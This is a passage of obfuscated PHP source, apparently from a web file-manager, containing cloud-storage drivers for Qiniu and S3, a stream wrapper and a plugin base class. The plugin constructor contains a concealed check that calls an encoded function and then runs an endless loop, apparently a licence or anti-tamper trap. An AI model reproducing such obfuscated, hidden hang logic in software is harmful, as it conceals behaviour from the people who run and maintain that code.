$_SERVER[Á÷ ­Šë]; if (!($İ‡Æí½ = $this->link($¿¨¿ûè))) { return !1; } $ú×—ÛÕä = !1; if ($êç€…¾“ > 0) { $‚Êãõí£ = $™ØÌ¯ŞŠ + $êç€…¾“ - 1; $ú×—ÛÕä = array($£Ê—Â¿[1352] . $™ØÌ¯ŞŠ . $£Ê—Â¿[464] . $‚Êãõí£); } $­¢‡º„Â = url_request($İ‡Æí½, $£Ê—Â¿[238], !1, $ú×—ÛÕä); return $­¢‡º„Â[$£Ê—Â¿[745]] ? $­¢‡º„Â[$£Ê—Â¿[1119]] : !1; } public function upload($Ì€ı, $¶©ÔÕ•Í, $Çœí¡‚ = false, $Ìô£ñÍ» = REPEAT_REPLACE) { $¤Ï¨¤Ö = new Qiniu\Storage\UploadManager(); $‹õÎ‘œÆ = $this->auth->uploadToken($this->bucket, $Ì€ı); $¶ı¾¶û = get_file_mime(get_path_ext($¶©ÔÕ•Í)); list($êßŞÓ²½, $–Î½˜Ë) = $¤Ï¨¤Ö->putFile($‹õÎ‘œÆ, $Ì€ı, $¶©ÔÕ•Í, null, $¶ı¾¶û); return $–Î½˜Ë ? !1 : $this->getPathOuter($Ì€ı); } public function uploadFormData($×¢Òµ„·, $™ş·¯ë = 3600) { return $this->uploadToken($×¢Òµ„·, $™ş·¯ë); } public function multiUploadFormData($ú„Ë»üÔ, $ºâ¶† = 3600) { return $this->uploadToken($ú„Ë»üÔ, $ºâ¶†); } private function uploadToken($òò¦õÇà, $÷ÄøÏŸ» = 3600) { $ŸÅ¶ªÅ¼ =& $_SERVER[Á÷ ­Šë]; $€¤’şÊø = $÷ÄøÏŸ»; $¿ü‚‡™« = array($ŸÅ¶ªÅ¼[1353] => $ŸÅ¶ªÅ¼[1354]); $–Å¢¾÷ = $òò¦õÇà; $¢³â£Œ¼ = $this->auth->uploadToken($this->bucket, $–Å¢¾÷, $€¤’şÊø, $¿ü‚‡™«, !0); $ªÒÖîÈ = empty($this->region) || $this->region == $ŸÅ¶ªÅ¼[1355] ? $ŸÅ¶ªÅ¼[33] : $ŸÅ¶ªÅ¼[464] . $this->region; $ƒ·™Ó“ = http_type() . "\72\x2f\x2f\165\x70\x6c\157\x61\144{$ªÒÖîÈ}\x2e\161\x69\156\151\x75\160\56\143\x6f\x6d\57"; return array($ŸÅ¶ªÅ¼[1356] => $¢³â£Œ¼, $ŸÅ¶ªÅ¼[1357] => $ƒ·™Ó“); } public function download($¾ÊÌŒ„Û, $ø×œ©´‘) { $˜¯Šé‘ = IO::getPathInner(IO::mkfile($ø×œ©´‘)); if (!($’»ŠÆ™¯ = $this->link($¾ÊÌŒ„Û))) { return !1; } $Ü‘¡ = 0; $²Èšôƒ§ = 1024 * 200; $»Âı¾ÓÀ = fopen($˜¯Šé‘, $_SERVER[Á÷ ­Šë][1358]); while (!0) { $çãò®ªÎ = $this->fileSubstr($¾ÊÌŒ„Û, $Ü‘¡, $²Èšôƒ§); if ($çãò®ªÎ === !1) { return !1; } fwrite($»Âı¾ÓÀ, $çãò®ªÎ); $Ü‘¡ += $²Èšôƒ§; if (strlen($çãò®ªÎ) < $²Èšôƒ§) { break; } } fclose($»Âı¾ÓÀ); return $ø×œ©´‘; } public function link($É—ÕÄ„á, $à¾½Œè‡ = '') { if (!$this->isFile($É—ÕÄ„á)) { return !1; } $¸¤ß¿Ó = $this->getHost() . $_SERVER[Á÷ ­Šë][8] . $this->pathEncode($É—ÕÄ„á) . $à¾½Œè‡; return $this->auth->privateDownloadUrl($¸¤ß¿Ó, 3600 * 12); } public function fileOut($¢õ¹Ğòá, $ÑÑ½´ûÂ = false, $”€¿Ø¾Ì = false, $å½÷ïšÂ = '') { $ˆ”Ã›Çú =& $_SERVER[Á÷ ­Šë]; if ($this->isFileOutServer()) { return $this->fileOutServer($¢õ¹Ğòá, $ÑÑ½´ûÂ, $”€¿Ø¾Ì, $å½÷ïšÂ); } if (!$”€¿Ø¾Ì) { $”€¿Ø¾Ì = $this->pathThis($¢õ¹Ğòá); } $ì™Áßò¿ = $ÑÑ½´ûÂ ? $ˆ”Ã›Çú[1359] . rawurlencode($”€¿Ø¾Ì) : $ˆ”Ã›Çú[33]; $Ö’¹êˆä = $this->link($¢õ¹Ğòá, $ì™Áßò¿); $this->fileOutLink($Ö’¹êˆä); } public function fileOutServer($îõ©„·, $“ñŸ·ó» = false, $şúÃõ¥­ = false, $•¯üşÏŞ = '') { parent::fileOut($îõ©„·, $“ñŸ·ó», $şúÃõ¥­, $•¯üşÏŞ); } public function fileOutImage($àÔï³Çı, $©ò¶ë¢ = 250) { $Ï¦·¥ = $this->link($àÔï³Çı, $_SERVER[Á÷ ­Šë][1360] . $©ò¶ë¢); $this->fileOutLink($Ï¦·¥); } public function fileOutImageServer($ ½¢¼ì, $Œ í¬şœ = 250) { parent::fileOutImage($ ½¢¼ì, $Œ í¬şœ); } public function hashMd5($¡ÏåÅ³À) { $ãåÓ«† =& $_SERVER[Á÷ ­Šë]; $Ş·½Æó» = $this->objectMeta($¡ÏåÅ³À); return isset($Ş·½Æó»[$ãåÓ«†[218]]) ? $Ş·½Æó»[$ãåÓ«†[218]] : !1; $Èù¦…Á² = $this->link($¡ÏåÅ³À, $ãåÓ«†[1361]); } public function size($´ÄŒÂ¨¥) { $™ğ¢÷±Ê = $this->objectMeta($´ÄŒÂ¨¥); return $™ğ¢÷±Ê ? $™ğ¢÷±Ê[$_SERVER[Á÷ ­Šë][88]] : 0; } public function info($ÚÅû„ƒß) { if ($this->isFolder($ÚÅû„ƒß)) { return $this->folderInfo($ÚÅû„ƒß); } else { if ($this->isFile($ÚÅû„ƒß)) { return $this->fileInfo($ÚÅû„ƒß); } } return !1; } public function exist($Óä§óãà) { return $this->isFile($Óä§óãà) || $this->isFolder($Óä§óãà); } public function isFile($¥»ãóˆİ) { return !$this->isFolder($¥»ãóˆİ) && $this->objectMeta($¥»ãóˆİ); } public function isFolder($‰‘ªµúº) { return $this->cacheMethod($_SERVER[Á÷ ­Šë][209], $‰‘ªµúº); } protected function objectMeta($¦ä¿•ß›) { return $this->cacheMethod($_SERVER[Á÷ ­Šë][210], $¦ä¿•ß›); } protected function _objectMeta($˜Õ¬úùÊ) { $ƒñ÷“ÏÙ =& $_SERVER[Á÷ ­Šë]; list($äëÓêâÆ, $îƒâş†æ) = $this->bucketManager->stat($this->bucket, $˜Õ¬úùÊ); if ($äëÓêâÆ) { $äëÓêâÆ[$ƒñ÷“ÏÙ[88]] = intval($äëÓêâÆ[$ƒñ÷“ÏÙ[1347]]); } return $äëÓêâÆ; } protected function _isFolder($Ñ­®´ôË) { $«Òæ£™Û =& $_SERVER[Á÷ ­Šë]; if ($Ñ­®´ôË == $«Òæ£™Û[33] || $Ñ­®´ôË == $«Òæ£™Û[8]) { return !0; } list($£±˜ºğğ, $’·£ğÅ) = $this->bucketManager->listFiles($this->bucket, trim($Ñ­®´ôË, $«Òæ£™Û[8]) . $«Òæ£™Û[8], $«Òæ£™Û[33], 1, $«Òæ£™Û[8]); return !empty($£±˜ºğğ[$«Òæ£™Û[1350]]) || !empty($£±˜ºğğ[$«Òæ£™Û[1351]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($Ùü¥Ï©») { parent::__construct($Ùü¥Ï©»); } public function uploadFormData($‡¿´”º©, $¢™„õçÍ = 3600) { $“÷¤Å²  =& $_SERVER[Á÷ ­Šë]; $øí•üï = $“÷¤Å² [202]; $®¶¤²ñ· = $“÷¤Å² [1268]; $¶ÀèæÂœ = $“÷¤Å² [69]; $ğ¥Ş£Æ = gmdate($“÷¤Å² [1269]); $¹€¾ØÊğ = gmdate($“÷¤Å² [746]); $æùÃÕ = $“÷¤Å² [1270]; $¾äÉ‘±Ë = $¢™„õçÍ . $“÷¤Å² [33]; $ÛÑ“î÷¾ = $“÷¤Å² [1232]; $ê³´áŸü = array($this->accessKey, $¹€¾ØÊğ, $this->region, $¶ÀèæÂœ, $æùÃÕ); $ò´ĞÊìö = implode($“÷¤Å² [8], $ê³´áŸü); $ÖæœÑ€º = array($“÷¤Å² [1234] => gmdate($“÷¤Å² [1233], strtotime($“÷¤Å² [1271])), $“÷¤Å² [1235] => array(array($“÷¤Å² [1237] => $this->bucket), array($“÷¤Å² [1236] => $øí•üï), array($“÷¤Å² [1238], $“÷¤Å² [1239], $“÷¤Å² [33]), array($“÷¤Å² [1238], $“÷¤Å² [1272], $“÷¤Å² [33]), array($“÷¤Å² [1238], $“÷¤Å² [1273], $“÷¤Å² [33]), array($“÷¤Å² [1240] => $ÛÑ“î÷¾), array($“÷¤Å² [1274] => $ò´ĞÊìö), array($“÷¤Å² [1275] => $®¶¤²ñ·), array($“÷¤Å² [1276] => $ğ¥Ş£Æ), array($“÷¤Å² [1277] => $¾äÉ‘±Ë))); $µÉ…ÁÙÒ = base64_encode(json_encode($ÖæœÑ€º)); $¦ĞÆ¯¼ = hash_hmac($“÷¤Å² [1278], $¹€¾ØÊğ, $“÷¤Å² [1279] . $this->secret, !0); $É‘Æ£ÜÓ = hash_hmac($“÷¤Å² [1278], $this->region, $¦ĞÆ¯¼, !0); $Œ·±£ºò = hash_hmac($“÷¤Å² [1278], $¶ÀèæÂœ, $É‘Æ£ÜÓ, !0); $üïÇœŸ¯ = hash_hmac($“÷¤Å² [1278], $æùÃÕ, $Œ·±£ºò, !0); $˜–ÑêØ = hash_hmac($“÷¤Å² [1278], $µÉ…ÁÙÒ, $üïÇœŸ¯); $µÜÈ³£ = array($“÷¤Å² [221] => $“÷¤Å² [33], $“÷¤Å² [1280] => $“÷¤Å² [33], $“÷¤Å² [1236] => $øí•üï, $“÷¤Å² [1240] => $ÛÑ“î÷¾, $“÷¤Å² [1244] => $µÉ…ÁÙÒ, $“÷¤Å² [1281] => $ò´ĞÊìö, $“÷¤Å² [1282] => $®¶¤²ñ·, $“÷¤Å² [1283] => $ğ¥Ş£Æ, $“÷¤Å² [1284] => $¾äÉ‘±Ë, $“÷¤Å² [1285] => $˜–ÑêØ, $“÷¤Å² [185] => $this->getHost()); return $µÜÈ³£; } public function multiUploadFormData($¾€¡Şõ, $Ÿ—¾§æÊ = 3600) { $‰ôêÀìğ =& $_SERVER[Á÷ ­Šë]; $Í–İ¼ÇÈ = gmdate($‰ôêÀìğ[1362]); $§Ñ‘¬–“ = array(); $ˆä¯ÈÁ§ = $this->client->getUploadId($this->bucket, $¾€¡Şõ, $§Ñ‘¬–“); if (!$ˆä¯ÈÁ§) { return !1; } return array($‰ôêÀìğ[231] => $ˆä¯ÈÁ§, $‰ôêÀìğ[185] => $this->getHost() . $‰ôêÀìğ[8] . $this->pathEncode($¾€¡Şõ), $‰ôêÀìğ[232] => $Í–İ¼ÇÈ, $‰ôêÀìğ[103] => $¾€¡Şõ); } public function multiUploadAuthData($¼èÓª‘‘, $ÔÇ×ØÂ = array()) { $õõó““ =& $_SERVER[Á÷ ­Šë]; $ŸáğàÌŸ = isset($ÔÇ×ØÂ[$õõó““[178]]) ? $ÔÇ×ØÂ[$õõó““[178]] : $õõó““[33]; $Û×ß³å = $ÔÇ×ØÂ[$õõó““[103]]; unset($ÔÇ×ØÂ[$õõó““[103]]); if (isset($ÔÇ×ØÂ[$õõó““[233]])) { return $this->listUploadParts($Û×ß³å, $ÔÇ×ØÂ); } $¢ØÄÕ = array(); if (isset($ÔÇ×ØÂ[$õõó““[1363]])) { $¢ØÄÕ[$õõó““[1364]] = $ÔÇ×ØÂ[$õõó““[1363]]; } $ù©¢ÔÕÔ = explode($õõó““[187], $this->getHost()); $È™¯æñÒ = array($õõó““[1365] => $ù©¢ÔÕÔ[1], $õõó““[1366] => $õõó““[33], $õõó““[221] => $õõó““[129], $õõó““[1280] => $ÔÇ×ØÂ[$õõó““[88]]); $æõÊÀÈ = $õõó““[236]; $ß •Ô‘† = $õõó““[8] . $this->pathEncode($Û×ß³å) . $ŸáğàÌŸ; $£ˆ€Ÿ¯í = $this->client->__getSignatureV4($¢ØÄÕ, $È™¯æñÒ, $æõÊÀÈ, $ß •Ô‘†); if (strpos($ŸáğàÌŸ, $õõó““[235]) === 0) { if (isset($¢ØÄÕ[$õõó““[1364]])) { $½úİ¼ªË = $¢ØÄÕ[$õõó““[1364]]; } else { if (isset($£ˆ€Ÿ¯í[$õõó““[1364]])) { $½úİ¼ªË = $£ˆ€Ÿ¯í[$õõó““[1364]]; } else { $½úİ¼ªË = hash($õõó““[1278], $õõó““[33]); } } return array($õõó““[241] => $£ˆ€Ÿ¯í[$õõó““[241]], $õõó““[1364] => $½úİ¼ªË, $õõó““[232] => $£ˆ€Ÿ¯í[$õõó““[1367]]); } return $£ˆ€Ÿ¯í[$õõó““[241]]; } public function listUploadParts($ÍŸÊô¸Û, $ÎÕÂıáÎ = array()) { $Å¬ñô‚ =& $_SERVER[Á÷ ­Šë]; $Á™Ù­­ø = str_replace($Å¬ñô‚[242], $Å¬ñô‚[33], $ÎÕÂıáÎ[$Å¬ñô‚[178]]); $ÍÅ‘‘§¥ = $this->client->listParts($this->bucket, $ÍŸÊô¸Û, $Á™Ù­­ø); if (!$ÍÅ‘‘§¥) { return !1; } $í¾ó¬‡ï = $Å¬ñô‚[1368]; foreach ($ÍÅ‘‘§¥ as $ï¯šö´©) { $í¾ó¬‡ï .= $Å¬ñô‚[1369] . "\x3c\120\x61\x72\164\x4e\165\155\142\x65\162\76{$ï¯šö´©[$Å¬ñô‚[1325]]}\x3c\x2f\120\x61\x72\164\x4e\165\x6d\x62\145\162\x3e\xa" . "\x3c\x45\124\141\147\76{$ï¯šö´©[$Å¬ñô‚[1326]]}\74\57\105\x54\141\x67\x3e\xa" . $Å¬ñô‚[1370]; } $í¾ó¬‡ï .= $Å¬ñô‚[1371]; $·ë•üëæ = array(); $ûõ¦ÖÒÇ = explode($Å¬ñô‚[187], $this->getHost()); $Ë‹ÂÇ³Æ = array($Å¬ñô‚[1365] => $ûõ¦ÖÒÇ[1], $Å¬ñô‚[221] => $Å¬ñô‚[129], $Å¬ñô‚[1280] => strlen($í¾ó¬‡ï)); $çß“¢ = $Å¬ñô‚[234]; $©ƒ‹çı‹ = $Å¬ñô‚[8] . $this->pathEncode($ÍŸÊô¸Û) . $ÎÕÂıáÎ[$Å¬ñô‚[178]]; $èÏ³Õ”‰ = $this->client->__getSignatureV4($·ë•üëæ, $Ë‹ÂÇ³Æ, $çß“¢, $©ƒ‹çı‹, $í¾ó¬‡ï); return array($Å¬ñô‚[241] => $èÏ³Õ”‰[$Å¬ñô‚[241]], $Å¬ñô‚[232] => $èÏ³Õ”‰[$Å¬ñô‚[1367]], $Å¬ñô‚[243] => $ÍÅ‘‘§¥, $Å¬ñô‚[1364] => $èÏ³Õ”‰[$Å¬ñô‚[1364]]); } public function link($ÔŞ´ñâø, $ÁÁåÕ©¸ = array()) { return parent::link($ÔŞ´ñâø, $ÁÁåÕ©¸); } public function fileOut($à¯Û˜Ê, $ÍÅä‹ç = false, $«ßÌ††± = false, $©Àİù¿ş = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[Á÷ ­Šë][1372])) { return parent::fileOutServer($à¯Û˜Ê, $ÍÅä‹ç, $«ßÌ††±, $©Àİù¿ş); } parent::fileOut($à¯Û˜Ê, $ÍÅä‹ç, $«ßÌ††±, $©Àİù¿ş); } public function fileOutImage($¨Ÿ©ÃğÅ, $¡£ÍÊÑØ = 250) { if (strstr($this->endpoint, $_SERVER[Á÷ ­Šë][1372])) { return parent::fileOutImageServer($¨Ÿ©ÃğÅ, $¡£ÍÊÑØ); } parent::fileOutImage($¨Ÿ©ÃğÅ, $¡£ÍÊÑØ); } public function fileOutLink($…ÊÌú«) { $ñÈ‡ßİØ =& $_SERVER[Á÷ ­Šë]; if (substr($…ÊÌú«, 0, 7) == $ñÈ‡ßİØ[1247]) { $…ÊÌú« = $ñÈ‡ßİØ[1248] . substr($…ÊÌú«, 7); } header($ñÈ‡ßİØ[169] . $…ÊÌú«); die; } public function getHost() { $™øØ÷‡ =& $_SERVER[Á÷ ­Šë]; $×ôçŒäõ = str_rtrim(parent::getHost(), $™øØ÷‡[8] . $this->bucket); $×ôçŒäõ = explode($™øØ÷‡[187], $×ôçŒäõ); return $×ôçŒäõ[0] . $™øØ÷‡[187] . $this->bucket . $™øØ÷‡[105] . $×ôçŒäõ[1]; } } goto bª–Ä£‰Ô­; eÙµç÷Ñç‰: class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($¶©ØÛÛé, $ÁÈ¥Ñ¼œ = '') { $this->info = $this->info($¶©ØÛÛé); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[Á÷ ­Šë][86]]; $this->pathOpen = $¶©ØÛÛé; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$¶©ØÛÛé])) { self::$_chunkBuffer[$¶©ØÛÛé] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($·‚¯çëÖ) { $æ”’ğ«Ì = $this->fileSubstr($this->pose, $·‚¯çëÖ); $this->pose += strlen($æ”’ğ«Ì); return $æ”’ğ«Ì; } public function stream_tell() { return $this->pose; } public function stream_seek($ùŞ›¾ÄÅ, $´»ìŞ“›) { $¢¢Ò¡•Ì =& $_SERVER[Á÷ ­Šë]; if ($´»ìŞ“› == SEEK_SET) { $this->pose = $ùŞ›¾ÄÅ; } else { if ($´»ìŞ“› == SEEK_CUR) { $this->pose += $ùŞ›¾ÄÅ; } else { if ($´»ìŞ“› == SEEK_END) { $this->pose = $this->info[$¢¢Ò¡•Ì[88]] + intval($ùŞ›¾ÄÅ); } } } if ($ùŞ›¾ÄÅ < 0) { $this->pose = $this->info[$¢¢Ò¡•Ì[88]] + $ùŞ›¾ÄÅ; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[Á÷ ­Šë][88]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($™Âæšğë, $¼™¥‘ìÈ) { $—æôòÖ =& $_SERVER[Á÷ ­Šë]; $¶óÊı»‡ = $this->info($™Âæšğë); return array($—æôòÖ[1423] => 0, $—æôòÖ[1424] => 0, $—æôòÖ[12] => 32768 + 511, $—æôòÖ[1425] => 0, $—æôòÖ[1426] => 0, $—æôòÖ[1427] => 0, $—æôòÖ[1428] => 0, $—æôòÖ[88] => $¶óÊı»‡[$—æôòÖ[88]], $—æôòÖ[1429] => $¶óÊı»‡[$—æôòÖ[1299]], $—æôòÖ[1385] => $¶óÊı»‡[$—æôòÖ[94]], $—æôòÖ[1384] => $¶óÊı»‡[$—æôòÖ[204]], $—æôòÖ[1430] => 0, $—æôòÖ[1431] => 0); } static $fileInfo = array(); public function info($«‚´¦Í‚) { $Ùö›Õ²† = $_SERVER[Á÷ ­Šë][1432]; if (isset(self::$fileInfo[$«‚´¦Í‚])) { return self::$fileInfo[$«‚´¦Í‚]; } if (substr($«‚´¦Í‚, 0, strlen($Ùö›Õ²†)) != $Ùö›Õ²†) { return !1; } self::$fileInfo[$«‚´¦Í‚] = IO::info(substr($«‚´¦Í‚, strlen($Ùö›Õ²†))); return self::$fileInfo[$«‚´¦Í‚]; } public static function read($À–±Å¶ø, $ƒò·âÙá, $¼âôÄ) { if (!isset(self::$_fopenCache[$À–±Å¶ø])) { $Ò¸Óí®‚ = new StreamWrapperIO(); $Ò¸Óí®‚->stream_open($À–±Å¶ø); self::$_fopenCache[$À–±Å¶ø] = $Ò¸Óí®‚; } $Ò¸Óí®‚ = self::$_fopenCache[$À–±Å¶ø]; return $Ò¸Óí®‚->fileSubstr($ƒò·âÙá, $¼âôÄ); } public static function _read($Ğä‰±¦, $“¡èŒ•í, $İ³„òÏÇ) { $…ºë§ï =& $_SERVER[Á÷ ­Šë]; $½à© Ó = fopen($Ğä‰±¦, $…ºë§ï[1303]); if (!$½à© Ó) { return $…ºë§ï[33]; } $—ĞâÒËö = 8192; fseek($½à© Ó, $“¡èŒ•í, SEEK_SET); $òæŠ‰ÍÏ = $…ºë§ï[33]; $Á†Êëñ» = 0; while ($Á†Êëñ» < $İ³„òÏÇ) { $ö¹è¬¶ˆ = min($—ĞâÒËö, $İ³„òÏÇ - $Á†Êëñ»); $òæŠ‰ÍÏ .= fread($½à© Ó, $ö¹è¬¶ˆ); $Á†Êëñ» += $ö¹è¬¶ˆ; } fclose($½à© Ó); return $òæŠ‰ÍÏ; } public function fileSubstr($¾†™“—Ï, $Šüµƒœş) { $¼¿ƒ‘•À =& $_SERVER[Á÷ ­Šë]; $êĞëÀ› = $this->info[$¼¿ƒ‘•À[88]]; $ŒŒŒô‡ï = $¾†™“—Ï; $™€ùç°› = $Šüµƒœş; if ($¾†™“—Ï < 0) { $¾†™“—Ï = $êĞëÀ› + $¾†™“—Ï; } if ($Šüµƒœş === !1) { $Šüµƒœş = $êĞëÀ› - $¾†™“—Ï; } if ($¾†™“—Ï + $Šüµƒœş > $êĞëÀ›) { $Šüµƒœş = $êĞëÀ› - $¾†™“—Ï; } if ($Šüµƒœş <= 0) { return $¼¿ƒ‘•À[33]; } if ($¾†™“—Ï < 0 || $¾†™“—Ï >= $êĞëÀ› || $Šüµƒœş <= 0 || $Šüµƒœş > 1024 * 1024 * 10) { throw new Exception("\x69\x6f\x46\151\154\x65\122\x65\x61\x64\40\145\x72\162\x6f\162\x21\x20\x73\164\x61\x72\x74\75{$¾†™“—Ï}\x3b\x6c\x65\156\147\x74\x68\x3d{$Šüµƒœş}\73\40\x73\x69\172\145\75{$êĞëÀ›}\73"); } $…¨«§˜… = 64 * 1024; $è÷”©Òó =& self::$_chunkBuffer[$this->path]; if (!$è÷”©Òó) { $è÷”©Òó = array(); } $÷êæ©ãª = 0; $¿şƒÔ‰û = 0; $Éš¸ªÂ“ = $¼¿ƒ‘•À[33]; foreach ($è÷”©Òó as $÷êæ©ãª => $Éš¸ªÂ“) { $÷êæ©ãª = intval($÷êæ©ãª); $¿şƒÔ‰û = $÷êæ©ãª + strlen($Éš¸ªÂ“); if ($¾†™“—Ï >= $¿şƒÔ‰û) { continue; } if ($¾†™“—Ï >= $÷êæ©ãª && $¾†™“—Ï + $Šüµƒœş <= $¿şƒÔ‰û) { return substr($Éš¸ªÂ“, $¾†™“—Ï - $÷êæ©ãª, $Šüµƒœş); } break; } if (count($è÷”©Òó) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($¼¿ƒ‘•À[1433], $¼¿ƒ‘•À[1434] . count($è÷”©Òó) . "\73\x73\164\x61\162\164\x3d{$¾†™“—Ï}\54\154\145\x6e\147\x74\x68\x3d{$Šüµƒœş}\x3b\160\157\x73\x65\72{$÷êæ©ãª}\x7e{$¿şƒÔ‰û}"); throw new Exception($¼¿ƒ‘•À[1435]); } $èÜ¼–Ôç = intval($¾†™“—Ï / $…¨«§˜…) * $…¨«§˜…; $È úùíƒ = ceil(($¾†™“—Ï + $Šüµƒœş) / $…¨«§˜…) * $…¨«§˜… - $èÜ¼–Ôç; $œÊŸ½Ş = IO::fileSubstr($this->path, $èÜ¼–Ôç, $È úùíƒ); $è÷”©Òó[$èÜ¼–Ôç . $¼¿ƒ‘•À[33]] = $œÊŸ½Ş; ksort($è÷”©Òó); $Ú›û¼ì = substr($œÊŸ½Ş, $¾†™“—Ï - $èÜ¼–Ôç, $Šüµƒœş); return $Ú›û¼ì; } private function log($¿´§Ù, $•§«¡ñ) { $­Å¥ÌÜ =& $_SERVER[Á÷ ­Šë]; $¿Í ÷…Á = timeFloat() - $this->timeStart; write_log(sprintf($­Å¥ÌÜ[1436], $¿´§Ù, $this->info[$­Å¥ÌÜ[28]], $¿Í ÷…Á, $•§«¡ñ), $­Å¥ÌÜ[1109]); } } class Message { function __construct() { } public function send($Õ¾ó–¾ª = '', $¾ÀÜ™è = array(), $Ûğ œÔÄ = "\164\x65\170\x74") { $Ìè½›à =& $_SERVER[Á÷ ­Šë]; $Ê’ŞöÉ± = array($Ìè½›à[29] => $Ìè½›à[1437], $Ìè½›à[750] => $Õ¾ó–¾ª); if (in_array($Ûğ œÔÄ, array($Ìè½›à[1437], $Ìè½›à[1438]))) { $Ê’ŞöÉ±[$Ìè½›à[29]] = $Ûğ œÔÄ; } $¾ÀÜ™è = array($Ìè½›à[519] => isset($¾ÀÜ™è[$Ìè½›à[519]]) ? $¾ÀÜ™è[$Ìè½›à[519]] : $Ìè½›à[33], $Ìè½›à[598] => isset($¾ÀÜ™è[$Ìè½›à[598]]) ? $¾ÀÜ™è[$Ìè½›à[598]] : $Ìè½›à[33]); if (empty($Õ¾ó–¾ª) || empty($¾ÀÜ™è[$Ìè½›à[519]]) && empty($¾ÀÜ™è[$Ìè½›à[598]])) { return !1; } $À¤¿ÆêŸ = array($Ìè½›à[1378] => $Ê’ŞöÉ±, $Ìè½›à[1439] => $¾ÀÜ™è); Hook::trigger($Ìè½›à[1440], $À¤¿ÆêŸ); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $ä±èÎè› =& $_SERVER[Á÷ ­Šë]; if (!isset($_SERVER[$ä±èÎè›[57]]) || !isset($_SERVER[$ä±èÎè›[66]])) { $‚‚€¯Æ = $ä±èÎè›[874]; $ÕŒõğõå = $ä±èÎè›[59]; $Èª–‚ç± = $_SERVER[$ä±èÎè›[60]] . $ä±èÎè›[61]; $’ôµõå = $ÕŒõğõå($Èª–‚ç±); $—É¨©ìÕ = explode($ä±èÎè›[62], $’ôµõå); if (count($—É¨©ìÕ) < $ä±èÎè›[639]) { $ë‡ó›ô‘ = $ä±èÎè›[64]; $ë‡ó›ô‘(); } $Ö‰úÄş¸ = $ä±èÎè›[875]; $Ö‰úÄş¸($_SERVER[$ä±èÎè›[876]]); $ôüƒ¤Î› = 1; for ($ëËë“Ë = $ôüƒ¤Î›; $ëËë“Ë > 0; $ëËë“Ë++) { $Ö‰úÄş¸ = json_encode($GLOBALS[$ä±èÎè›[423]]); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($ä±èÎè›[1441]); $this->pluginName = str_replace($ä±èÎè›[1441], $ä±èÎè›[33], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $ä±èÎè›[8]; $this->pluginApi = appHostGet() . $ä±èÎè›[1442] . $this->pluginName . $ä±èÎè›[8]; $this->pluginHost = $config[$ä±èÎè›[1443]] . $this->pluginName . $ä±èÎè›[8]; $this->pluginHostDefault = $config[$ä±èÎè›[1443]] . $this->pluginName . $ä±èÎè›[8]; $ÏÁ‰¦’µ = $config[$ä±èÎè›[1444]]; if ($ÏÁ‰¦’µ && strpos($ä±èÎè›[47] . $ÏÁ‰¦’µ . $ä±èÎè›[47], $this->pluginName) !== !1) { $this->pluginHost = $config[$ä±èÎè›[1445]] . $this->pluginName . $ä±èÎè›[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[Á÷ ­Šë][1446]); } protected function assign($×âãÈ³Ú, $¯³­äĞ = false) { if (is_array($×âãÈ³Ú)) { $this->values = array_merge($this->values, $×âãÈ³Ú); } else { $this->values[$×âãÈ³Ú] = $¯³­äĞ; } } protected function display($™Œ”î†) { extract($this->values); require $™Œ”î†; } final function hookRegist($¾ï ©ª„) { $this->modelPlugin->appRegist($this->pluginName, $¾ï ©ª„); } final function appIcon() { $¡¾öãÂÛ =& $_SERVER[Á÷ ­Šë]; $Å¼ŒŞ±¡ = $this->appPackage(); $ğ‹Û—ßĞ = $¡¾öãÂÛ[33]; if (isset($Å¼ŒŞ±¡[$¡¾öãÂÛ[421]])) { if (isset($Å¼ŒŞ±¡[$¡¾öãÂÛ[421]][$¡¾öãÂÛ[1447]])) { $ğ‹Û—ßĞ = $¡¾öãÂÛ[1448] . $Å¼ŒŞ±¡[$¡¾öãÂÛ[421]][$¡¾öãÂÛ[1447]] . $¡¾öãÂÛ[1449]; } else { if ($Å¼ŒŞ±¡[$¡¾öãÂÛ[421]][$¡¾öãÂÛ[1450]]) { $ğ‹Û—ßĞ = $¡¾öãÂÛ[1451] . $Å¼ŒŞ±¡[$¡¾öãÂÛ[421]][$¡¾öãÂÛ[1450]] . $¡¾öãÂÛ[1452]; } } } return $ğ‹Û—ßĞ; } final function fileCanView($‡‹Å¼Ò) { $»×ÏµÕ =& $_SERVER[Á÷ ­Šë]; if (request_url_safe($‡‹Å¼Ò)) { return !0; } if ($this->isShare($‡‹Å¼Ò)) { return !0; } $ë÷úˆÙ = Session::get($»×ÏµÕ[1453]); if (!$ë÷úˆÙ || !$ë÷úˆÙ[$»×ÏµÕ[1454]]) { $Ï¥åÇ = $»×ÏµÕ[1455] . rawurlencode(this_url()); show_tips(LNG($»×ÏµÕ[1456]) . $»×ÏµÕ[1457] . $Ï¥åÇ . $»×ÏµÕ[1458] . LNG($»×ÏµÕ[1459]) . $»×ÏµÕ[1460], !1); } if (!Action($»×ÏµÕ[1461])->authCan($»×ÏµÕ[1462])) { show_tips(LNG($»×ÏµÕ[1463]) . $»×ÏµÕ[1464], !1); } ActionCall($»×ÏµÕ[1465], $‡‹Å¼Ò); } final function isShare($†ù˜Å„) { $íØ‹¢ºÜ = KodIO::parse($†ù˜Å„); return $íØ‹¢ºÜ[$_SERVER[Á÷ ­Šë][29]] == KodIO::KOD_SHARE_LINK; } final function 